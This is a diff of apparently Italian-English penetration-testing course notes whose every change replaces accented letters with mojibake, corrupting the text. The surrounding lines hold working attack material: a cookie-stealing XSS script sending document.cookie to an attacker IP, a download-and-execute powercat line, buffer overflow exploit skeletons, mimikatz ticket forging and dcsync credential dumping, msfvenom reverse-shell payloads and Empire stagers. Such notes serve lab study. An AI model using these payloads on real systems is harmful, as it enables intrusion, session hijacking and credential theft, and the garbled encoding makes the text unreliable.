@@ -9,7 +9,7 @@ kali@kali: $
 kali@kali$: env
 
 axel 
-è un download accellerator that transfers file from FTP or HTTP in server attraverso connessioni multiple 
+Ã¨ un download accellerator that transfers file from FTP or HTTP in server attraverso connessioni multiple 
 
 curl -o kekko.pdf https://www.prendeterobagratis.com/kekko.pdf
 
@@ -103,7 +103,7 @@ nc -nv 10.11.0.22 443 open ipconfig
 sarebbe powershell ma la versione di netcat 
 
 apt install powercat 
---> il file sarà su /usr/share/windows-resources/powercat 
+--> il file sarÃ  su /usr/share/windows-resources/powercat 
 
 PS	C:\Users\Offsec>	iex	(New-Object	System.Net.Webclient).DownloadString('https://raw.	
 githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
@@ -144,7 +144,7 @@ HMAWwAiAGwAIgBdACAAPQAgACQARgBhAGwAcwBlAAoAIAAgACAAIAAgACAAJABTAG8AYwBrAGUAdAAgA
 OAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAGMAc	
 ABDAGwAaQBlAG4AdAAKACAAIAAgACA
 
-//il payload lo si può generare anche con un msfvenom
+//il payload lo si puÃ² generare anche con un msfvenom
 
 kali@kali $: sudo nc -lnvp 443
 
@@ -157,7 +157,7 @@ Password:anonymous
 
 ftp> quit 
 
-1° check requests fpt User anonymous
+1Â° check requests fpt User anonymous
 
 follow TCP Stream 
 
@@ -167,7 +167,7 @@ site:instagram.com -filetype:html
 intitle:"index of" "parent directory" 
 
 --netcraft
-risorsa necessaria per la ricerca domini DNS e GUI-stlyed quindi lo può utilizzare anche iachetti 
+risorsa necessaria per la ricerca domini DNS e GUI-stlyed quindi lo puÃ² utilizzare anche iachetti 
 
 recon-ng 
 recon-ng149 is a module-based framework for web-based information gathering. Recon-ng displays the
@@ -287,7 +287,7 @@ kali@kali:~$	nmap	-v	-p	139,445	--script=smb-vuln-ms08-067	--script-args=unsafe=
 
 NFS Enumeration
 (Network File System)
-	nmap	-v	-p	111	10.11.1.1-254 (questa è la versione ez) 
+	nmap	-v	-p	111	10.11.1.1-254 (questa Ã¨ la versione ez) 
 
 kali@kali:~$	nmap	-sV	-p	111	--script=rpcinfo	10.11.1.1-254	...
 
@@ -382,12 +382,12 @@ sudo nc -nvlp 80
 
 ---Stealing Cookies and Session Information 
 
-Cookies : Secure(ssl) HttpOnly(può essere utilizzato per il XSS payload) 
+Cookies : Secure(ssl) HttpOnly(puÃ² essere utilizzato per il XSS payload) 
 
 Cookie stealer: 
 <script>new	Image().src="http://10.11.0.4/cool.jpg?output="+document.cookie;</script>	
 
-**aspettare che un utente si autentifichi così poi da inculare il suo PHPSESSID**
+**aspettare che un utente si autentifichi cosÃ¬ poi da inculare il suo PHPSESSID**
 
 script per simulare un utente al login (Powershell):
 
@@ -408,22 +408,22 @@ C:\Users\admin\Documents>	powershell	-ExecutionPolicy	Bypass	-File	admin_login.p
 kali@kali$: sudo nc -nvlp 80 
 GET ... PHPSESSID=<cookie> 
 
-sostituire il cookie che abbiamo con quello ottenuto e il gioco è fatto 
-We can also use busybox, “the Swiss Army Knife of Embedded Linux”, to run an HTTP server with httpd	
+sostituire il cookie che abbiamo con quello ottenuto e il gioco Ã¨ fatto 
+We can also use busybox, Â“the Swiss Army Knife of Embedded LinuxÂ”, to run an HTTP server with httpd	
 as the function, -f	to run interactively, and -p	10000	to run on TCP port 10000:
 kali@kali:~$	busybox	httpd	-f	-p	10000
 Listing 308 - Using BusyBox to run an HTTP server on port 10000 
 
 Buffer Overflow
 
-ESP è il puntatore dello stack 
-(la location più recente dello stack )
+ESP Ã¨ il puntatore dello stack 
+(la location piÃ¹ recente dello stack )
 
-EBP è il puntatore base 
-(è un puntatore che imagazzina il puntatore al top dello stack quando una funzione viene chiamata) 
+EBP Ã¨ il puntatore base 
+(Ã¨ un puntatore che imagazzina il puntatore al top dello stack quando una funzione viene chiamata) 
 
-EIP è il puntatore che punta all' istruzione dopo da eseguire
-(lo dice già la descrizione)
+EIP Ã¨ il puntatore che punta all' istruzione dopo da eseguire
+(lo dice giÃ  la descrizione)
 
 
 Windows Buffer Overflows 
@@ -562,7 +562,7 @@ offset	=	"C"	*	4
 buffer	=	"D"	*	(1500	- len(filler)	- len(eip)	- len(offset))	
 inputBuffer	=	filler	+	eip	+	offset	+	buffer	...	
 
-in questa D sarà il nostro placeholder per il nostro shellcode
+in questa D sarÃ  il nostro placeholder per il nostro shellcode
 
 
 #!/usr/bin/python	import	socket	
@@ -648,7 +648,7 @@ NT AUTHORITY\SYSTEM
 
 ---LINUX BUFFER OVERFLOW 
 
-Crossfire è un multiplayer role game 
+Crossfire Ã¨ un multiplayer role game 
 
 root@debian cd /usr/games/crossfire/bin
 
@@ -658,7 +658,7 @@ root@debian # edb
 
 run --> Filter crossfire 
 
-script per effettuare il buffer overflow per vedere se è possibile farlo su Crossfire 
+script per effettuare il buffer overflow per vedere se Ã¨ possibile farlo su Crossfire 
 
 #!/usr/bin/python	import	socket	
 host	=	"10.11.0.128"	
@@ -792,11 +792,11 @@ username = "admin" password = "password"
 *modificare credenziali*
 
 Packers
-malware che offuscano il codice lo coprono.. ed è possibile scoprirlo attraverso reverse engineering 
+malware che offuscano il codice lo coprono.. ed Ã¨ possibile scoprirlo attraverso reverse engineering 
 
-Remote Process Memory Injection (la più famosa anche chiamata Powershell Injection)
+Remote Process Memory Injection (la piÃ¹ famosa anche chiamata Powershell Injection)
 
-questo malware crea nuove sezioni o cambia sezioni intere di permessi.. questa tecnica è incentrata principalmente la manipolazione della memoria volatile 
+questo malware crea nuove sezioni o cambia sezioni intere di permessi.. questa tecnica Ã¨ incentrata principalmente la manipolazione della memoria volatile 
 
 l' OpenProcess ottiene un valid HANDLE per mirare al processo dove abbiamo i permessi. Dopo aver ottenuto HANDLE lo allocheremo nella memoria e nel contesto del processo. All' interno del processo inseriremo il payload e otterremo l'accesso del processo e lo applichiamo utilizzando un altro nuovo processo chiamando un API come VirtualAllocEX ed una volta alllocato ed eseguito possiamo separare il thread usando CreateRemoteThread API (WriteProcessMemory) 
 
@@ -804,7 +804,7 @@ Reflective DLL Injection
 attraverso un DLL usando LoadLibrary API 
 
 Process Hollowing 
-attaccanti prima lanciano un processo non malevolo in sospeso. poi lanciano l'imaggine del processo è rimuovono dalla memoria e rimpiazzato con un executable image malevolo. 
+attaccanti prima lanciano un processo non malevolo in sospeso. poi lanciano l'imaggine del processo Ã¨ rimuovono dalla memoria e rimpiazzato con un executable image malevolo. 
 
 Inline hooking 
 tecnica che modifica la memoria e introduce hook (instruzione che redirige l'esecuzione del codice) nella funzione e la punta il flusso di esecuzione verso il malware  
@@ -910,7 +910,7 @@ C:\Users\admin\Desktop> .\av_test.ps1
 meterpreter > getuid 
 
 Shellter 
-è un dinamic shellcode injection tool più utilizzato per bypassare l' antivirus usa più tecniche per creare una backdoor valida e un eseguibile con payload shellcode 
+Ã¨ un dinamic shellcode injection tool piÃ¹ utilizzato per bypassare l' antivirus usa piÃ¹ tecniche per creare una backdoor valida e un eseguibile con payload shellcode 
 (supporta anche altri payload non solo meterpreter ) 
 
 
@@ -943,7 +943,8 @@ student@debian:~$./unix-privesc-check
 
 
 
-nel caso della cve-2017-10000112 
+
+nel caso della cve-2017-10000112 
 
 cat /etc/issue
 
@@ -994,7 +995,7 @@ C:\Windows\system32>
 
 C:\Tools\port_redirection_and_tunneling>	plink.exe	-ssh	-l	kali	-pw	ilak	-R	10.11.0.4:	1234:127.0.0.1:3306	10.11.0.4
 
-plink.exe è un tool utilizzato per effettuare una redirection di un SSH -pw <password>
+plink.exe Ã¨ un tool utilizzato per effettuare una redirection di un SSH -pw <password>
 
 --Active Directory 
 
@@ -1078,9 +1079,9 @@ PS C:\Tools\active_directory>.\PSExec.exe \\dc01 cmd.exe
 C:\Windows\system32> whoami
 jeff_admin
 
-mimikatz può inserire all'interno della memoria dei silver ticket grazie a kerberos::golden 
+mimikatz puÃ² inserire all'interno della memoria dei silver ticket grazie a kerberos::golden 
 
-il sivler ticket è formato da user, domain, sid, target, service:HTTP, /rc4 (password dell' hash per l' iis_service )
+il sivler ticket Ã¨ formato da user, domain, sid, target, service:HTTP, /rc4 (password dell' hash per l' iis_service )
 
 C:\>whoami /user
 
@@ -1092,7 +1093,7 @@ mimikatz # kerberos::golden /user:offsec /domain:corp.com /sid:S-1... /target:..
 
 mimikatz #kerberos list 
 
-ed il gioco è fatto 
+ed il gioco Ã¨ fatto 
 
 ---Domain Controller Syncronization
 
@@ -1103,7 +1104,7 @@ se succede questo
 mimikatz # lsadump::dcsync /user:Administrator 
 //trova il NTLM hash 
 
-facendo così ottenitamo la replica e gli hash delle password 	di ogni account dell' Active Directory 
+facendo cosÃ¬ ottenitamo la replica e gli hash delle password 	di ogni account dell' Active Directory 
 
 ---Creare il tuo payload 
 *meterpreter deve essere attivo quindi la sessione deve essere accesa 
@@ -1116,7 +1117,7 @@ sudo mkdir -p /root/.msf4/modules/exploits/windows/http
 
 kali@kali:~/.msf4/modules/exploits/windows/http$	sudo	nano	/root/.msf4/modules/exploit	s/windows/http/syncbreeze.rb	
 
-*niente è un semplice buffer overflow fatto già precendentemente*
+*niente Ã¨ un semplice buffer overflow fatto giÃ  precendentemente*
 
 Post Exploitation
 
@@ -1153,11 +1154,11 @@ kali@kali $ sudo msfconsole -r setup.rc
 
 kali@kali:~$	msfvenom	-p	windows/meterpreter/reverse_https	LHOST=10.11.0.4	LPORT=443	-f	exe	-o	met.exe
 
-//configura già il payload con LPORT e LHOST (parametrPi)
+//configura giÃ  il payload con LPORT e LHOST (parametrPi)
 
 PowershellEmpire 
 
-Empire è un agent che tratta tutto il lato post-exploitation quindi molto concentrato sul lato del client e exploit e post-exploit su AD 
+Empire Ã¨ un agent che tratta tutto il lato post-exploitation quindi molto concentrato sul lato del client e exploit e post-exploit su AD 
 
 kali@kali$ cd /opt
 
@@ -1183,7 +1184,7 @@ sudo ./empire
 
 	(Empire:	listeners/http)	>	back	(Empire:	listeners)	>	usestager	
 
-//stager stabilisce una connessione tra la vittima e l'attaccante è un payload particolare 
+//stager stabilisce una connessione tra la vittima e l'attaccante Ã¨ un payload particolare 
 
 in questo caso Empire Agent genera un stager ovvero un file.bat che fornisce la comunicazione con l' attaccante con traffico AES utilizzando le richieste GET e POST e appena viene avviato si autoelimina 
 
@@ -1230,9 +1231,9 @@ rshell/privesc/powerup/allchecks
 execute
 
 -y 
-//all' interno ci sarà un agent con privilegi più alti 
+//all' interno ci sarÃ  un agent con privilegi piÃ¹ alti 
 
-Empire agents > interact <id privilegio più alto K6.. >
+Empire agents > interact <id privilegio piÃ¹ alto K6.. >
 
 (Empire:	K678VC13)	>	usemodule	credentials/
 
@@ -1385,7 +1386,7 @@ meterpreter > background
 
 PS	C:\Windows\system32>	$dcsesh	=	New-PSSession	-Computer	SANDBOXDC
 
-// dcsesh avrà il nome di SANDBOX 
+// dcsesh avrÃ  il nome di SANDBOX 
 
 PS	C:\Windows\system32>	Invoke-Command	-Session	$dcsesh	-ScriptBlock	{C:\Users\Public\ whoami.exe}
 
